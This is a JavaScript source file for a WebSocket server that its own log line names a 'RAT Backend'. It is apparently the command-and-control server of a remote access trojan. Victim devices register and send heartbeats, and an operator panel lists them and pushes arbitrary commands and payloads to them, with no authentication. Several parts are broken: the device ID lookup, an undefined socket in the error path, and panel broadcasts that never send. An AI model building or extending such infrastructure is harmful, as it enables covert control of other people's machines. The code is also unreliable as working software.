const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const PORT = 6050;

const deviceConnections = new Map();
const panelConnections = new Map();

app.get('/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.get('/devices', (req, res) => {
    const devices = [];
    deviceConnections.forEach((info, id) => {
        devices.push({ id, lastHeartbeat: info.lastHeartbeat });
    });
    res.json({ devices });
});

// WebSocket upgrade handler for both /ws and /panel
server.on('upgrade', (req, socket, head) => {
    const url = req.url;
    if (url === '/ws') {
        wss.handleUpgrade(req, socket, head, (ws) => {
            wss.emit('connection', ws, req);
        });
    } else if (url === '/panel') {
        wss.handleUpgrade(req, socket, head, (ws) => {
            wss.emit('connection', ws, req);
        });
    } else {
        socket.destroy();
    }
});

wss.on('connection', (ws, req) => {
    const url = req.url;
    const deviceId = req.query.device_id;

    if (url === '/ws') {
        // Device connection
        if (!deviceId) {
            ws.close();
            return;
        }

        deviceConnections.set(deviceId, {
            lastHeartbeat: Date.now(),
            ws: ws
        });

        ws.on('message', (data) => {
            try {
                const msg = JSON.parse(data);
                handleMessage(deviceId, msg);
            } catch (e) {
                console.error('Invalid message:', e);
            }
        });

        ws.on('close', () => {
            deviceConnections.delete(deviceId);
            broadcast('device_disconnected', { device_id: deviceId });
        });
    } else if (url === '/panel') {
        // Panel connection
        panelConnections.set(ws, { connected: true });

        ws.on('message', (data) => {
            try {
                const msg = JSON.parse(data);
                handlePanelMessage(msg);
            } catch (e) {
                console.error('Panel message error:', e);
            }
        });

        ws.on('close', () => {
            panelConnections.forEach((conn, id) => {
                if (conn === ws) {
                    panelConnections.delete(id);
                }
            });
        });
    }
});

function handleMessage(deviceId, msg) {
    const deviceInfo = deviceConnections.get(deviceId);
    if (!deviceInfo) return;

    if (msg.type === 'heartbeat') {
        deviceInfo.lastHeartbeat = Date.now();
        return;
    }

    if (msg.type === 'command') {
        const targetDeviceId = msg.target_device_id || deviceId;
        const targetWs = deviceConnections.get(targetDeviceId)?.ws;
        if (targetWs) {
            targetWs.send(JSON.stringify(msg));
        } else {
            ws.send(JSON.stringify({
                type: 'error',
                message: 'Device not found: ' + targetDeviceId
            }));
        }
    }
}

function handlePanelMessage(msg) {
    if (msg.type === 'get_devices') {
        const devices = [];
        deviceConnections.forEach((info, id) => {
            devices.push({ id, lastHeartbeat: info.lastHeartbeat });
        });
        // Send to all panel connections
        panelConnections.forEach((conn) => {
            if (conn.ws && conn.ws.readyState === WebSocket.OPEN) {
                conn.ws.send(JSON.stringify({
                    type: 'initial_devices',
                    payload: devices
                }));
            }
        });
        return;
    }

    if (msg.type === 'send_command') {
        const targetDeviceId = msg.target_device_id;
        const message = msg.message;
        const targetWs = deviceConnections.get(targetDeviceId)?.ws;
        if (targetWs) {
            targetWs.send(JSON.stringify({
                type: 'command',
                target_device_id: targetDeviceId,
                action: msg.action,
                request_id: uuidv4(),
                payload: msg.payload
            }));
        } else {
            // Send error to all panels
            panelConnections.forEach((conn) => {
                if (conn.ws && conn.ws.readyState === WebSocket.OPEN) {
                    conn.ws.send(JSON.stringify({
                        type: 'error',
                        message: 'Device not found: ' + targetDeviceId
                    }));
                }
            });
        }
    }
}

function broadcast(event, data) {
    panelConnections.forEach((conn) => {
        if (conn.ws && conn.ws.readyState === WebSocket.OPEN) {
            conn.ws.send(JSON.stringify({ type: event, ...data }));
        }
    });
}

setInterval(() => {
    const now = Date.now();
    deviceConnections.forEach((info, id) => {
        if (now - info.lastHeartbeat > 90000) {
            info.ws.close();
            deviceConnections.delete(id);
            broadcast('device_disconnected', { device_id: id });
        }
    });
}, 10000);

setInterval(() => {
    deviceConnections.forEach((info, id) => {
        if (info.ws && info.ws.readyState === WebSocket.OPEN) {
            info.ws.send(JSON.stringify({
                type: 'heartbeat',
                device_id: id,
                payload: { timestamp: Date.now() }
            }));
        }
    });
}, 30000);

server.listen(PORT, '0.0.0.0', () => {
    console.log(`RAT Backend listening on port ${PORT}`);
});

module.exports = server;
